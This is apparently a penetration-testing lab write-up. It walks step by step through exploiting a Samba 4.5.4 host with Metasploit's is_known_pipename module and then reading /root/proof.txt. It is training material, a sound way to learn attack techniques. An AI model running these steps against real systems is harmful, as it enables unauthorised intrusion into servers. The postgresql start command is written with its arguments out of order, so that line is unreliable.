Attack Vector 5 - Windows 6.1 Samba 4.5.4-Ubuntu

Notice the result from os-smb-discovery

Google search for: Windows 6.1 Samba 4.5.4
![6c9b35fe1864ac50d8478322a8b65c56.png](../../../_resources/0cc5510b594e4e6ca826a2b84036335f.png)

Choose the exploit-db link. **EDB-ID: 42084**
Notice that it requires metasploit
![7eba9bf837a2378a971a7bb8e2e54c6f.png](../../../_resources/67a6cfa54b354170979b8813b89317ce.png)

Start postgresql
`sudo systemctl postgresql start`
![8f66e4a76a2291b7521eb2aa612e03ce.png](../../../_resources/d1227f7cd61e490497705c82c836144a.png)

Start the msfconsole without ascii banner
`sudo msfconsole -q`
![999d70f5a952d6a36f76881945062ff0.png](../../../_resources/1bdc1103ff9e467b90107b953233d8a8.png)

Search for 'is_known_pipename' and select it
`search is_known_pipename`
`use 0`
![5802c1285e97fd501b4cf2332bc25d91.png](../../../_resources/a1413088c270482cbde51be698bceb8d.png)

Show options
`show options`
![ec2a2e3df44ce540e1ababa9db36dec4.png](../../../_resources/b105380f7204498f99ee5733cfb665b1.png)

Change rhosts to the target IP
`set rhosts 10.11.1.146`
![5a756399c644783c794f69a0dbf59667.png](../../../_resources/96cd9edef449486e9f1d7fefa9718ba4.png)

Verify that the change to rhosts was made
`show options`
![2ca1d4c199a107b8a5b55e77cd47ab15.png](../../../_resources/e964807e8f4a47f7872ffc6318922657.png)

Check to see if the exploit will work
`check`
![0a38a7c3bafcb7628d9e6bc724e660ce.png](../../../_resources/c571b68d46bd4b659f24a3dfa4ad470d.png)

Run the exploit command
`exploit`
![175b8bf179e86c11d004f951804c26f4.png](../../../_resources/9edeb38de05b4cd5a6a4b7a6b9da73d2.png)

Check id
`whoami`
![a0df099e3d7f7680762d7d98b5ee9f5f.png](../../../_resources/48d5496243e040fbb7ae5bec0e059c6b.png)

Check what directory we're in
`pwd`
![9ee77662099a4564ecf846d91a78046a.png](../../../_resources/7de7cb31e6aa4a7fa400209952e176cc.png)

Check what files are in /root
`ls -la /root/*`
![9ec485c5e7b188d95c524e18133d4e6f.png](../../../_resources/39aad9dd83d64626821ddc42b26741b5.png)

Read /root/proof.txt file
`cat /root/proof.txt`
![8894a4ba820ff9200096f3d9e2e82924.png](../../../_resources/0e4165b0ade84e73ad291335dea58e54.png)




